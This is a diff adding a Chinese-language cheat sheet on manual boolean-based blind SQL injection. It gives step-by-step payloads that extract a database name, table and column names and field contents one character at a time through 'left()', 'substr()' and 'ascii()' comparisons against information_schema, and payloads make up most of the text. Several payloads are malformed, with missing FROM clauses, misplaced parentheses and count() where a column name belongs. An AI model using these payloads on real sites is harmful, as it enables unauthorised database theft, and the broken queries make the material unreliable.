@@ -1,0 +1,44 @@
+由于盲注不像普通注入那么简单，在次提个醒。在万不得已的情况下不用盲注
+
+手工盲注测试，需要用到substr()、length()、ascii()、left()、count()这些sql数据库函数。
+ascii(a)将a转换成其ASCII值
+ord(a)将a转换成其ASCII值
+left(a,b)从左往右截取字符串a的前b个字符
+substr(a,b,c)从b位置开始，截取字符串a的c长度
+mid(a,b,c)从位置b开始，截取a字符串的c位
+select * from table_name limit m,n;表示从m+1开始取n条查询记录
+
+拆解数据库长度：and (length(database())=1) --+ //直到页面返回错误，然后错误的长度-1 =数据库长度
+对数据库每个字符进行拆解：and (left(database(),1)='s') //s为你要拆解的字符,如果正确页面会返回正确，错误页面返回错误,1为长度，假设上面猜出的数据库长度为8，那么你就要猜到8
+and (left(database(),2)='se') //第一个拆解正确的加第二个继续猜解
+and (left(database(),3)='sec')
+and (left(database(),4)='secu')
+and (left(database(),5)='secur')
+and (left(database(),6)='securi') 
+and (left(database(),7)='securit')
+and (left(database(),8)='security')
+
+拆解表的个数：
+and 1=(select count(table_name) from information_schema.tables where table_schema='数据库名') //1为个数，要把1跑到页面出错，然后那个数-1就是表的个数
+
+判断每个表的长度：
+and ascii(substr((select table_name information_schema.tables where table_schema='数据库名' limit 0,1)),1,1) //这里的0表的个数，上面你跑出几个个数。这里就要弄几个，例如上面是8那么你就要0-8跑完，然后),1是表名的长度，要跑到页面出错的数-1=表名的长度
+
+拆解表名
+and ascii(substr((select count(table_name) information_schema.tables where table_schema='数据库名' limit 0,1)),1,1)=97 //这里的97为ascii码，遍历ASCII码表。如果其中一个ascii码页面返回正确，那么表名的其中一个就是这个
+
+拆解字段和上面的方法差不多
+
+拆解列的个数
+and 1=(select count(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名')
+拆解每个列名的长度
+and ascii(substr((select count(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1)),1,1)
+拆解列名
+ and ascii(substr((select count(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1)),1,1)=97
+ 
+ 拆解字段的个数
+ and 1=(select count(列名) from 数据库名)
+ 拆解每个字段的长度
+ and ascii(substr((select 列名 from 数据库名 limit 0,1)),1,1)
+ 拆解每个字段内容
+  and ascii(substr((select 列名 from 数据库名 limit 0,1)),1,1)=97
